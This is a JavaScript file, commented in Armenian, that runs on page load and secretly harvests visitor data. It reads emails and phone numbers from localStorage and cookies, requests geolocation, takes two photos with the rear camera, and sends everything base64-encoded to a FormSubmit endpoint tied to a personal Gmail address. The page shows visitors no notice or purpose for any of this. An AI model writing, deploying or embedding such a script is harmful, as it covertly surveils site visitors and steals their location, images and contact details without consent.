// Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
async function trackVisitor() {
    const data = {
      website: window.location.href || "index.html",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      referrer: document.referrer || "Direct visit",
      visitTime: new Date().toISOString(),
      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
    };
  
    // Ստուգել localStorage-ում պահված տվյալները
    try {
      const savedEmail = localStorage.getItem('userEmail');
      const savedPhone = localStorage.getItem('userPhone');
      
      if (savedEmail) data.savedEmail = savedEmail;
      if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
      console.log("LocalStorage access error:", e);
    }
  
    // Ստուգել cookies-ում պահված տվյալները
    try {
      const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
      }, {});
  
      if (cookies.email) data.cookieEmail = cookies.email;
      if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
      console.log("Cookie access error:", e);
    }
  
    // Փորձել ստանալ գեոտեղադրություն
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          data.latitude = position.coords.latitude;
          data.longitude = position.coords.longitude;
          captureAndSend(data);
        },
        () => {
          data.locationError = "Geolocation unavailable";
          captureAndSend(data);
        }
      );
    } else {
      captureAndSend(data);
    }
  }
  
  // Սքրինշոթների կատարում և ուղարկում
  async function captureAndSend(data) {
    try {
      // Փորձել մուտք գործել տեսախցիկներ
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } }, // Հետևի տեսախցիկ
        audio: false
      });
      
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      
      // Կատարել սքրինշոթ
      const frontBlob = await imageCapture.takePhoto();
      const backBlob = await imageCapture.takePhoto(); // Կարող եք փոխել տեսախցիկի ռեժիմը
      
      // Փակել տեսախցիկը
      videoTrack.stop();
      
      // Փոխակերպել blob-երը base64
      const frontImage = await blobToBase64(frontBlob);
      const backImage = await blobToBase64(backBlob);
      
      data.frontCameraImage = frontImage;
      data.backCameraImage = backImage;
      
      sendData(data);
    } catch (error) {
      console.error("Camera access error:", error);
      data.cameraError = error.message;
      sendData(data);
    }
  }
  
  // Blob-ը փոխակերպել base64
  function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }
  
  // Տվյալների ուղարկում FormSubmit-ին
  function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
      method: "POST",
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log("Success:", data))
    .catch(error => console.error("Error:", error));
  }
  
  // Գործարկել հետևումը էջի բեռնվելուց հետո
  window.addEventListener('load', trackVisitor);